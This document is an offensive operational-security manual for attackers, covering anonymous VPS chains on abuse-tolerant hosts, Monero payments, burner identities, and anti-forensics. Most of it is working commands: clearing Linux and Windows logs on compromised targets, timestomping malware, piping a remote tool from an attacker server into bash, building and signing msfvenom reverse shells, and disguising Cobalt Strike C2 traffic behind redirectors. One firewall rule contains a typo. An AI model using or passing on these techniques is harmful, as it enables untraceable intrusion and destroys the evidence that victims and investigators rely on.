
## Section 1: Infrastructure Architecture — Your Attack Platform

### 1.1 The Layered Approach

You never attack from home. Ever. Here's the chain:

**You → VPN 1 → VPS (Jump Box) → VPN 2 → Target**

Or for maximum paranoia:

**You → Tor → VPN → VPS → Target**

But Tor is slow and fingerprinted by most enterprise defenses. Use it for recon only. For operations, use the double-VPS method.

### 1.2 Setting Up Bulletproof Infrastructure

**Step 1: Anonymous VPS Providers**

These providers ignore abuse complaints or have lax verification:

- **Njalla** — Privacy-focused, accepts crypto, doesn't ask questions.
- **1984 Hosting** — Iceland-based, strong privacy laws.
- **AbeloHost** — Offshore, accepts Bitcoin.
- **FlokiNET** — Iceland/Finland/Romania, privacy-respecting.
- **BuyVM** — Accepts crypto, cheap, reliable.

**Commands to purchase with Monero:**

```bash
# Install Monero CLI wallet
wget https://downloads.getmonero.org/cli/linux64
tar -xjvf monero-linux-x64-*.tar.bz2
cd monero-x86_64-linux-gnu-*/

# Run full node (takes days) or use remote node
./monerod --detach

# Create wallet
./monero-wallet-cli --generate-new-wallet ghost_ops

# Get address, send XMR from exchange (use non-KYC exchange like TradeOgre or Bisq)
# Then pay Njalla/AbeloHost with the XMR address they provide
```

**Step 2: Harden Your VPS Immediately**

SSH into your fresh VPS and lock it down:

```bash
# Update everything
apt update && apt full-upgrade -y

# Create non-root user
useradd -m -s /bin/bash ghost
usermod -aG sudo ghost
passwd ghost

# Copy your SSH key (generate one specifically for this VPS)
su - ghost
mkdir ~/.ssh
chmod 700 ~/.ssh
# Paste your VPS-specific SSH public key
nano ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Back to root, disable password auth and root login
nano /etc/ssh/sshd_config
# Set these:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
AllowUsers ghost

# Restart SSH
systemctl restart sshd

# Install and configure firewall
apt install ufw -y
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw enable

# Install fail2ban
apt install fail2ban -y
systemctl enable fail2ban
systemctl start fail2ban

# Set up automatic security updates
apt install unattended-upgrades -y
dpkg-reconfigure -plow unattended-upgrades
```

**Step 3: VPN Chaining**

Install WireGuard on your VPS (faster and more secure than OpenVPN):

```bash
# On VPS (exit node)
apt install wireguard -y
wg genkey | tee privatekey | wg pubkey > publickey

# Create WireGuard config
nano /etc/wireguard/wg0.conf

[Interface]
PrivateKey = <VPS_PRIVATE_KEY>
Address = 10.200.200.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASNET
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Enable IP forwarding
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

# Start WireGuard
wg-quick up wg0
systemctl enable wg-quick@wg0

# On your local machine, install WireGuard client
# Add peer config pointing to your VPS
[Interface]
PrivateKey = <YOUR_PRIVATE_KEY>
Address = 10.200.200.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = <VPS_PUBLIC_KEY>
AllowedIPs = 0.0.0.0/0
Endpoint = <VPS_IP>:51820
PersistentKeepalive = 25
```

**For double-hop:** Rent a second VPS in a different jurisdiction. SSH through the first VPN into the second, then run operations from there.

```bash
# From your machine
wg-quick up wg0  # Connects to VPS 1

# SSH through VPS 1 to VPS 2
ssh -J ghost@vps1_ip ghost@vps2_ip

# On VPS 2, run all your operations
# Your traffic path: You → VPS1 → VPS2 → Target
# If VPS2 is burned, they trace to VPS1. If VPS1 is burned, they hit a dead end.
```

---

## Section 2: Local Machine Hardening

### 2.1 The Red Team Laptop

Dedicated hardware. Never use your personal machine. Buy a used ThinkPad (X1 Carbon or T480) with cash from Craigslist/Facebook Marketplace. Remove the webcam and microphone physically if you're paranoid.

**Operating System: Kali Linux on encrypted LUKS**

```bash
# During Kali installation, choose "Guided - use entire disk and set up encrypted LVM"
# Use a STRONG passphrase (20+ characters, random)

# After install, verify encryption
lsblk
# Should show cryptsetup mapping

# Set up secure boot with your own keys (advanced, optional)
```

### 2.2 MAC Address Randomization

Every network interface has a burned-in MAC address. Change it before every operation.

```bash
# Install macchanger
apt install macchanger -y

# Check current MAC
ip link show eth0

# Bring interface down, randomize MAC, bring up
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up

# Or use a specific OUI (Organizationally Unique Identifier) to blend in
sudo macchanger -m 00:11:22:33:44:55 eth0

# Automate on boot
nano /etc/NetworkManager/NetworkManager.conf

# Add:
[device]
wifi.scan-rand-mac-address=yes

[connection]
wifi.cloned-mac-address=random
ethernet.cloned-mac-address=random
```

### 2.3 Hostname Randomization

Don't use "kali" or your name. Randomize.

```bash
# Generate random hostname
NEW_HOST=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 10)
echo $NEW_HOST

# Set it
sudo hostnamectl set-hostname $NEW_HOST

# Update /etc/hosts
sudo sed -i "s/127.0.1.1.*/127.0.1.1\t$NEW_HOST/" /etc/hosts

# Verify
hostname
```

### 2.4 Timezone & Locale Randomization

```bash
# List timezones
timedatectl list-timezones

# Set to target's timezone (helps blend in)
sudo timedatectl set-timezone America/New_York

# Or randomize
sudo timedatectl set-timezone $(timedatectl list-timezones | shuf -n 1)
```

### 2.5 DNS Leak Prevention

```bash
# Install and configure dnscrypt-proxy
apt install dnscrypt-proxy -y

# Edit config
nano /etc/dnscrypt-proxy/dnscrypt-proxy.toml

# Use only anonymized DNS relays
server_names = ['cloudflare', 'quad9-dnscrypt-ip4-filter-pri']

# Force all DNS through it
sudo systemctl enable dnscrypt-proxy
sudo systemctl start dnscrypt-proxy

# Test for leaks
# Visit https://dnsleaktest.com from browser after connecting to VPN
```

### 2.6 Kill Switch

If your VPN drops, your real IP leaks. Prevent this.

```bash
# Using iptables (flush existing rules first)
sudo iptables -F
sudo iptables -X

# Default deny
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow VPN interface only (replace tun0 with your VPN interface)
sudo iptables -A OUTPUT -o tun0 -j ACCEPT

# Allow VPN server IP (so you can connect to it)
sudo iptables -A OUTPUT -d <VPN_SERVER_IP> -j ACCEPT

# Save rules
sudo apt install iptables-persistent -y
sudo netfilter-persistent save
```

---

## Section 3: Anonymous Communication

### 3.1 Email

Never use Gmail, Outlook, Yahoo. Use:

- **ProtonMail** (Swiss, encrypted, but requires phone verification sometimes)
- **Tutanota** (German, encrypted, more anonymous)
- **CTemplar** (Icelandic, accepts Monero)
- **SimpleLogin** aliases for everything

### 3.2 Messaging

- **Signal** — Disappearing messages, sealed sender. Register with burner number.
- **Session** — No phone number required, onion routing built-in.
- **SimpleX Chat** — No identifiers at all, decentralized.

```bash
# Install Session
# Download AppImage from getsession.org
chmod +x session-desktop-linux-*.AppImage
./session-desktop-linux-*.AppImage

# Generate Session ID, share only that. No phone, no email.
```

### 3.3 Burner Phone Numbers

- **TextNow** — Free US/Canada numbers (requires email only)
- **Google Voice** — Needs US number to verify, but then works independently
- **Hushed** — Paid, accepts crypto
- **Physical burner** — TracFone or similar, bought with cash, activated with fake info, never turned on near your home

---

## Section 4: Payment Anonymity

### 4.1 Cryptocurrency

**Monero (XMR)** is the only truly private cryptocurrency. Bitcoin is a public ledger.

```bash
# Buy XMR
# Option 1: Non-KYC exchange
# TradeOgre, Bisq, HodlHodl

# Option 2: LocalMonero (P2P, cash in person)
# Option 3: Bitcoin ATM → convert to XMR using MorphToken or FixedFloat

# Verify XMR transaction privacy
# In monero-wallet-cli:
show_transfers
# RingCT hides the sender, ring signatures hide the source
```

### 4.2 Virtual Cards

- **Privacy.com** — Create burner cards linked to bank, but US only and requires SSN
- **Revolut** disposable cards (less anonymous)
- **Prepaid Visa/Mastercard** bought with cash at grocery stores

---

## Section 5: Operational Anti-Forensics

When you're ON a target system, you need to leave no trace.

### 5.1 Log Clearing on Linux Targets

```bash
# View current logs
ls -la /var/log/

# Clear bash history (do this BEFORE exiting)
history -c
history -w
cat /dev/null > ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# Clear system logs
# Auth logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/secure

# Syslog
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/messages

# Wtmp/utmp (login records)
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/utmp
cat /dev/null > /var/log/btmp

# Lastlog
cat /dev/null > /var/log/lastlog

# Clear journalctl
journalctl --rotate
journalctl --vacuum-time=1s

# For systemd systems, stop logging temporarily
systemctl stop rsyslog
systemctl stop systemd-journald
# (This is noisy—better to clear after)

# Secure deletion of files you dropped
shred -vfz -n 10 /path/to/your/tool
rm -f /path/to/your/tool

# Or use secure rm
apt install secure-delete
srm -vz /path/to/file
```

### 5.2 Log Clearing on Windows Targets

```powershell
# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# Clear event logs (requires admin)
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# Or individually
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Stop event logging temporarily (NOISY—use with caution)
Stop-Service EventLog -Force

# Clear recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse

# Clear temp files
Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue

# Clear prefetch
Remove-Item "C:\Windows\Prefetch\*" -Force -Recurse -ErrorAction SilentlyContinue

# Secure delete with cipher (overwrites free space)
cipher /w:C:\path\to\folder
```

### 5.3 Timestomping

Modify file timestamps to blend with legitimate files.

```bash
# Linux: touch with reference file
touch -r /bin/ls /path/to/your/malware

# Or set specific time
touch -t 202301011200.00 /path/to/your/malware

# Windows PowerShell:
$(Get-Item C:\Windows\System32\kernel32.dll).LastWriteTime | Set-ItemProperty -Path C:\path\to\your\malware -Name LastWriteTime
```

### 5.4 Memory-Only Execution

The best forensics evasion is never touching disk.

```bash
# Linux: Execute from /dev/shm (RAM disk)
cp your_tool /dev/shm/
chmod +x /dev/shm/your_tool
/dev/shm/your_tool

# Or pipe directly from network
curl -s http://your-server/tool | bash

# Windows: Reflective DLL injection, .NET assembly loaded entirely in memory
# Use tools like Invoke-ReflectivePEInjection or custom loaders
```

### 5.5 Disable Windows Event Tracing (ETW)

```powershell
# Patch ETW in current process (advanced, requires understanding of ntdll)
# This is detectable by some EDR, use with caution

# More subtle: log manipulation via WMI
# Create a WMI event subscription that deletes specific event IDs as they arrive
# (Complex, but stealthy)
```

---

## Section 6: Tool Attribution Avoidance

### 6.1 Customizing Your Arsenal

Never use default Metasploit payloads. Recompile everything.

```bash
# Example: Customizing a Metasploit reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_vps LPORT=443 -f c -e x64/zutto_dekiru -i 5 > shell.c

# Modify the C source:
# - Change User-Agent string
# - Change sleep intervals
# - Add junk code/dead code
# - Recompile with different compiler flags
x86_64-w64-mingw32-gcc -o custom_shell.exe shell.c -s -O2

# Strip symbols
strip custom_shell.exe

# Sign with self-signed cert (bypasses some weak checks)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem

# Sign the binary (Windows)
signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /td sha256 /fd sha256 custom_shell.exe
```

### 6.2 Cobalt Strike Malleable C2 Profile

If you use Cobalt Strike (industry standard for red teams), customize the profile to mimic legitimate traffic.

```bash
# Example profile snippet mimicking Google Chrome updates
# Save as google.profile

http-get {
    set uri "/update/check";
    client {
        header "Accept" "application/json";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend "{\"version\":\"";
            append "\",\"url\":\"https://update.google.com\"}";
            print;
        }
    }
}

# Launch with custom profile
./teamserver <your_vps_ip> <password> google.profile
```

### 6.3 Domain Fronting & CDN Abuse

Use reputable CDNs to hide your C2 origin.

```bash
# Example: Azure domain fronting (getting harder as providers patch this)
# Point your C2 to a CDN endpoint
# Use a legitimate-looking Host header that routes through the CDN to your origin

# Or use redirectors
# VPS 1: Nginx redirector that forwards to VPS 2 (real C2)
# If VPS 1 is burned, VPS 2 remains hidden

# nginx.conf on redirector:
server {
    listen 80;
    server_name legit-looking-domain.com;
    
    location /api/v1/sync {
        proxy_pass http://<REAL_C2_IP>:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

---

## Section 7: Post-Operation Cleanup

### 7.1 Infrastructure Burn

After an engagement, burn everything.

```bash
# Destroy VPS
# Njalla: Log in, click destroy, done
# DigitalOcean/AWS: API call or console

# Example DigitalOcean API
curl -X DELETE \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_TOKEN>" \
  "https://api.digitalocean.com/v2/droplets/<DROPLET_ID>"

# Remove DNS records
# If using Cloudflare (for redirectors), purge all records

# Release domains
# Let them expire or transfer to dead-drop registrar
```

### 7.2 Local Cleanup

```bash
# Secure wipe your red team laptop (if compromise is suspected)
# Boot from Kali USB
dd if=/dev/urandom of=/dev/sda bs=1M status=progress
# Then:
dd if=/dev/zero of=/dev/sda bs=1M status=progress

# Or use shred on specific files
shred -vfz -n 35 /path/to/sensitive/file

# Clear swap
swapoff -a
dd if=/dev/zero of=/swapfile bs=1M
mkswap /swapfile
swapon /swapfile
```

### 7.3 Communication Hygiene

- Delete all Signal/Session messages with disappearing timer set to 5 minutes
- Burn burner phone numbers
- Close all burner email accounts
- Change all aliases and personas

---

## Section 8: The Daily OPSEC Checklist

Before EVERY operation:

```bash
#!/bin/bash
# opsec_check.sh

echo "[*] Randomizing MAC..."
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up

echo "[*] Randomizing hostname..."
NEW_HOST=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 12)
sudo hostnamectl set-hostname $NEW_HOST
sudo sed -i "s/127.0.1.1.*/127.0.1.1\t$NEW_HOST/" /etc/hosts

echo "[*] Connecting to VPN..."
sudo wg-quick up wg0

echo "[*] Verifying IP..."
curl -s https://ipinfo.io

echo "[*] Checking DNS leaks..."
# Manual: visit dnsleaktest.com

echo "[*] Verifying kill switch..."
sudo iptables -L -v -n | grep DROP

echo "[*] Clearing local logs..."
history -c
history -w
cat /dev/null > ~/.bash_history

echo "[+] OPSEC check complete. You are ghost."
```

---

## Section 9: Advanced — Tails OS for Maximum Paranoia

For operations where you cannot risk ANY local trace:

```bash
# Download Tails from tails.boum.org
# Verify signature:
gpg --verify tails-amd64-*.img.sig tails-amd64-*.img

# Flash to USB
sudo dd if=tails-amd64-*.img of=/dev/sdX bs=1M status=progress

# Boot from USB
# Tails runs entirely in RAM, leaves no trace on host disk
# Built-in Tor, MAC spoofing, encrypted persistence (optional)

# In Tails, all traffic is forced through Tor
# Use additional VPN after Tor for Tor-unfriendly targets
```

---
